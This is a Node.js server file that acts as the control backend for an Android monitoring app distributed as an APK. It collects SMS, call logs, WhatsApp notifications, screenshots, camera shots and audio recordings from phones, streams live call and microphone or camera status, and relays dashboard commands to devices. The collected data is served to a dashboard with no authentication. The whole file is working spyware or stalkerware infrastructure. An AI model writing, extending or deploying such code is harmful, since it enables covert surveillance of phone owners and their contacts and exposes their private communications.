require('dotenv').config();
const express = require('express');
const http = require('http');
const https = require('https');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const mongoose = require('mongoose');
const authRoutes = require('./src/routes/auth');
const callSyncRoutes = require('./src/routes/callSync');
const { logInfo, logWarn, logError } = require('./src/utils/logger');

const app = express();
const corsOrigin = process.env.CORS_ORIGIN || '*';
const enableHttps = String(process.env.ENABLE_HTTPS || 'false').toLowerCase() === 'true';
const httpsKeyPath = process.env.HTTPS_KEY_PATH || '';
const httpsCertPath = process.env.HTTPS_CERT_PATH || '';

const transportServer = createTransportServer(app);
const io = new Server(transportServer, {
  cors: {
    origin: corsOrigin,
    methods: ['GET', 'POST']
  }
});

const PORT = process.env.PORT || 3000;
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/access';
const UPLOADS_DIR = path.join(__dirname, 'uploads');
const FRONTEND_DIST_DIR = resolveFrontendDistDir();

// Ensure uploads folder exists
if (!fs.existsSync(UPLOADS_DIR)) {
  fs.mkdirSync(UPLOADS_DIR, { recursive: true });
}

// Middleware
app.use(cors({ origin: corsOrigin }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use('/uploads', express.static(UPLOADS_DIR));
app.use('/api/v1/auth', authRoutes);
app.use('/api/v1/call-logs', callSyncRoutes);

// Endpoint to download the Release APK
app.get('/download/app', (req, res) => {
  const apkPath = path.join(__dirname, '..', 'android', 'app', 'build', 'outputs', 'apk', 'release', 'app-release.apk');
  if (fs.existsSync(apkPath)) {
    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
    res.download(apkPath, 'AccessPoint.apk');
  } else {
    res.status(404).json({ status: 'error', message: 'APK build not found' });
  }
});

// Connect to MongoDB
mongoose.connect(MONGODB_URI)
  .then(() => logInfo('Connected to MongoDB successfully'))
  .catch(err => logError('MongoDB connection error', err));

// MongoDB Schemas & Models
const DeviceSchema = new mongoose.Schema({
  deviceId: { type: String, required: true, unique: true },
  deviceName: { type: String },
  status: { type: String, default: 'offline' },
  lastSeen: { type: Date, default: Date.now }
});

const SmsSchema = new mongoose.Schema({
  device_id: { type: String, required: true },
  address: { type: String },
  body: { type: String },
  date: { type: String }, // Stored as ISO/Formatted String from client
  received_at: { type: Date, default: Date.now }
});
SmsSchema.index({ device_id: 1, address: 1, body: 1, date: 1 }, { unique: true });

const CallLogSchema = new mongoose.Schema({
  device_id: { type: String, required: true },
  id: { type: String },
  phoneNumber: { type: String },
  formattedNumber: { type: String },
  duration: { type: Number },
  name: { type: String },
  timestamp: { type: String },
  dateTime: { type: String },
  type: { type: String },
  rawType: { type: Number },
  phoneAccountId: { type: String },
  simDisplayName: { type: String },
  cachedMatchedNumber: { type: String },
  cachedNumberType: { type: String },
  cachedNumberLabel: { type: String },
  received_at: { type: Date, default: Date.now }
});
CallLogSchema.index({ device_id: 1, phoneNumber: 1, timestamp: 1 }, { unique: true });

const WhatsappLogSchema = new mongoose.Schema({
  device_id: { type: String, required: true },
  title: { type: String },
  text: { type: String },
  date: { type: Date, default: Date.now }
});

const MediaFileSchema = new mongoose.Schema({
  device_id: { type: String, required: true },
  filename: { type: String },
  fileUrl: { type: String },
  type: { type: String }, // 'screenshot', 'camera', 'recording'
  timestamp: { type: Date, default: Date.now }
});

const Device = mongoose.model('Device', DeviceSchema);
const Sms = mongoose.model('Sms', SmsSchema);
const CallLog = mongoose.model('CallLog', CallLogSchema);
const WhatsappLog = mongoose.model('WhatsappLog', WhatsappLogSchema);
const MediaFile = mongoose.model('MediaFile', MediaFileSchema);

// Helper: Query all data and format for React Dashboard compatibility
async function getDBData() {
  const devicesList = await Device.find({});
  const smsList = await Sms.find({}).sort({ received_at: -1 });
  const callsList = await CallLog.find({}).sort({ received_at: -1 });
  const whatsappList = await WhatsappLog.find({}).sort({ date: -1 });
  const mediaList = await MediaFile.find({}).sort({ timestamp: -1 });

  // Convert Device list array to Device Map object: { [deviceId]: { deviceName, status, lastSeen } }
  const devicesObj = {};
  devicesList.forEach(dev => {
    devicesObj[dev.deviceId] = {
      deviceName: dev.deviceName || 'Android Device',
      status: dev.status || 'offline',
      lastSeen: dev.lastSeen ? dev.lastSeen.toISOString() : new Date().toISOString()
    };
  });

  const recordings = mediaList.filter(item => item.type === 'recording');
  const photos = mediaList.filter(item => item.type !== 'recording');

  return {
    devices: devicesObj,
    sms: smsList,
    call_logs: callsList,
    whatsapp: whatsappList,
    recordings,
    photos
  };
}

// Multer Storage Setup
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, UPLOADS_DIR);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});
const upload = multer({ storage: storage });

// REST APIs
// 1. Get database details (for dashboard load)
app.get('/api/data', async (req, res) => {
  try {
    const data = await getDBData();
    res.json(data);
  } catch (err) {
    logError('Failed to load database state', err);
    res.status(500).json({ status: 'error', message: 'Internal Server Error' });
  }
});

// 2. Incoming SMS Endpoint (REST compatible with React Native App)
app.post('/api/sms', async (req, res) => {
  const { messages, device_id, device_name } = req.body;
  const deviceId = device_id || 'unknown-device';

  try {
    // Upsert device info
    await Device.findOneAndUpdate(
      { deviceId },
      { deviceName: device_name || 'Android Device', lastSeen: new Date(), status: 'online' },
      { upsert: true }
    );

    // Save SMS messages avoiding duplicate entries using findOneAndUpdate
    if (Array.isArray(messages)) {
      for (const msg of messages) {
        try {
          await Sms.findOneAndUpdate(
            {
              device_id: deviceId,
              address: msg.address,
              body: msg.body,
              date: msg.date
            },
            {
              device_id: deviceId,
              address: msg.address,
              body: msg.body,
              date: msg.date
            },
            { upsert: true, new: true }
          );
        } catch (err) {
          // Suppress index errors if any race conditions
        }
      }
    }

    // Notify dashboards in real-time
    io.to('dashboards').emit('data_updated', { type: 'sms' });
    res.status(200).json({ status: 'success', message: 'SMS received and stored in MongoDB' });
  } catch (err) {
    logError('SMS save failed', err);
    res.status(500).json({ status: 'error', message: 'SMS database insertion failed' });
  }
});

// 3. Incoming Call Log Endpoint (REST compatible)
app.post('/api/calllog', async (req, res) => {
  const { call_logs, device_id, device_name } = req.body;
  const deviceId = device_id || 'unknown-device';

  try {
    // Upsert device info
    await Device.findOneAndUpdate(
      { deviceId },
      { deviceName: device_name || 'Android Device', lastSeen: new Date(), status: 'online' },
      { upsert: true }
    );

    // Save Call Logs avoiding duplicate entries
    if (Array.isArray(call_logs)) {
      for (const log of call_logs) {
        try {
          await CallLog.findOneAndUpdate(
            {
              device_id: deviceId,
              phoneNumber: log.phoneNumber,
              timestamp: log.timestamp
            },
            {
              device_id: deviceId,
              ...log
            },
            { upsert: true, new: true }
          );
        } catch (err) {
          // Suppress potential unique index check race errors
        }
      }
    }

    // Notify dashboards in real-time
    io.to('dashboards').emit('data_updated', { type: 'call_logs' });
    res.status(200).json({ status: 'success', message: 'Call logs received and stored in MongoDB' });
  } catch (err) {
    logError('Call logs save failed', err);
    res.status(500).json({ status: 'error', message: 'Call logs database insertion failed' });
  }
});

// 4. File Upload Endpoint (for screenshots, camera shots, voice recordings)
app.post('/api/upload', upload.single('file'), async (req, res) => {
  const { device_id, type } = req.body; // type: 'screenshot', 'camera', 'recording'
  if (!req.file) {
    return res.status(400).json({ status: 'error', message: 'No file uploaded' });
  }

  const fileUrl = `/uploads/${req.file.filename}`;
  const deviceId = device_id || 'unknown-device';

  try {
    const newMedia = new MediaFile({
      device_id: deviceId,
      filename: req.file.filename,
      fileUrl,
      type,
      timestamp: new Date()
    });
    await newMedia.save();

    // Notify dashboards in real-time
    io.to('dashboards').emit('data_updated', { type, file: newMedia });
    res.json({ status: 'success', fileUrl });
  } catch (err) {
    logError('Media file metadata save failed', err);
    res.status(500).json({ status: 'error', message: 'Database save failed' });
  }
});

// Socket.io Implementation
io.on('connection', (socket) => {
  logInfo(`Socket connected: ${socket.id}`);

  // Register Dashboard
  socket.on('dashboard:register', async () => {
    socket.join('dashboards');
    logInfo(`Socket ${socket.id} registered as Dashboard`);
    try {
      const data = await getDBData();
      socket.emit('dashboard:init', data);
    } catch (err) {
      logError('Error sending dashboard init data', err);
    }
  });

  // Register Mobile Device
  socket.on('device:register', async (data) => {
    const { deviceId, deviceName } = data;
    socket.deviceId = deviceId;
    socket.join('devices');
    socket.join(`device_${deviceId}`);
    logInfo(`Device registered: ${deviceName} (${deviceId})`);

    const lastSeen = new Date();
    await Device.findOneAndUpdate(
      { deviceId },
      { deviceName: deviceName || 'Android Device', lastSeen, status: 'online' },
      { upsert: true }
    );

    // Broadcast status change to dashboards
    io.to('dashboards').emit('device_status_change', {
      deviceId,
      deviceName,
      status: 'online',
      lastSeen: lastSeen.toISOString()
    });
  });

  // Handle Command from Dashboard to Device
  socket.on('dashboard:command', (data) => {
    const { deviceId, action, payload } = data;
    logInfo(`Command received from dashboard to device ${deviceId}: ${action}`);
    io.to(`device_${deviceId}`).emit('device:command', { action, payload });
  });

  socket.on('device:command_result', (data) => {
    const { deviceId, action, success, message } = data || {};
    logInfo(`Command result from ${deviceId}: ${action} => ${success ? 'success' : 'failed'} (${message || 'no-message'})`);
    io.to('dashboards').emit('device:command_result', data);
  });

  // Handle WhatsApp Logs
  socket.on('device:whatsapp', async (data) => {
    const { deviceId, title, text, timestamp } = data;
    
    try {
      const newLog = new WhatsappLog({
        device_id: deviceId,
        title,
        text,
        date: timestamp ? new Date(timestamp) : new Date()
      });
      await newLog.save();

      io.to('dashboards').emit('device:whatsapp_received', newLog);
    } catch (err) {
      logError('Failed to save WhatsApp notification log', err);
    }
  });

  // Handle Mic Status from Device
  socket.on('device:mic_status', (data) => {
    const { deviceId, status } = data;
    logInfo(`Mic status from ${deviceId}: ${status}`);
    io.to('dashboards').emit('device:mic_status', { deviceId, status });
  });

  // Handle Live Camera Status from Device
  socket.on('device:camera_live_status', (data) => {
    const { deviceId, status, camera, intervalMs } = data;
    logInfo(`Live camera status from ${deviceId}: ${status} (${camera || 'back'})`);
    io.to('dashboards').emit('device:camera_live_status', {
      deviceId,
      status,
      camera: camera || 'back',
      intervalMs,
      timestamp: new Date().toISOString(),
    });
  });

  // Handle Live Call Alerts
  socket.on('device:livecall', (data) => {
    const { deviceId, state, incomingNumber, callType } = data;
    logInfo(`Live call state from ${deviceId}: ${state} - ${incomingNumber}`);
    
    // Broadcast live event instantly to dashboards
    io.to('dashboards').emit('device:livecall_alert', {
      deviceId,
      state,
      incomingNumber,
      callType,
      timestamp: new Date().toISOString()
    });
  });

  // Handle Disconnect
  socket.on('disconnect', async () => {
    logInfo(`Socket disconnected: ${socket.id}`);
    
    if (socket.deviceId) {
      const lastSeen = new Date();
      try {
        const dev = await Device.findOneAndUpdate(
          { deviceId: socket.deviceId },
          { status: 'offline', lastSeen },
          { new: true }
        );

        if (dev) {
          io.to('dashboards').emit('device_status_change', {
            deviceId: socket.deviceId,
            deviceName: dev.deviceName,
            status: 'offline',
            lastSeen: lastSeen.toISOString()
          });
        }
      } catch (err) {
        logError('Failed to disconnect update status', err);
      }
    }
  });
});

if (FRONTEND_DIST_DIR) {
  app.use(express.static(FRONTEND_DIST_DIR));

  app.get('*', (req, res, next) => {
    if (req.path.startsWith('/api') || req.path.startsWith('/uploads') || req.path.startsWith('/socket.io')) {
      return next();
    }
    return res.sendFile(path.join(FRONTEND_DIST_DIR, 'index.html'));
  });
}

app.use((req, res) => {
  res.status(404).json({
    status: 'error',
    message: 'Route not found',
  });
});

app.use((err, req, res, next) => {
  logError('Unhandled API error', err);
  const isValidationError =
    err && typeof err.message === 'string' && err.message.toLowerCase().includes('requires callid');
  if (isValidationError) {
    return res.status(400).json({
      status: 'error',
      message: err.message,
    });
  }

  return res.status(500).json({
    status: 'error',
    message: 'Internal Server Error',
  });
});

transportServer.listen(PORT, '0.0.0.0', () => {
  const protocol = enableHttps ? 'https' : 'http';
  logInfo(`Control Server running on ${protocol}://localhost:${PORT}`);
  if (FRONTEND_DIST_DIR) {
    logInfo(`Serving frontend from ${FRONTEND_DIST_DIR}`);
  } else {
    logWarn('Frontend dist directory not found. API and socket endpoints are available only.');
  }
});

function createTransportServer(expressApp) {
  if (!enableHttps) {
    return http.createServer(expressApp);
  }

  try {
    const key = fs.readFileSync(path.resolve(__dirname, httpsKeyPath));
    const cert = fs.readFileSync(path.resolve(__dirname, httpsCertPath));
    logInfo('HTTPS transport enabled');
    return https.createServer({ key, cert }, expressApp);
  } catch (error) {
    logWarn('HTTPS certificates unavailable. Falling back to HTTP.', {
      httpsKeyPath,
      httpsCertPath,
      error: error.message,
    });
    return http.createServer(expressApp);
  }
}

function resolveFrontendDistDir() {
  const candidates = [
    path.join(__dirname, 'dist'),
    path.join(__dirname, '..', 'dashboard', 'dist'),
  ];

  return candidates.find(candidate => fs.existsSync(path.join(candidate, 'index.html'))) || null;
}
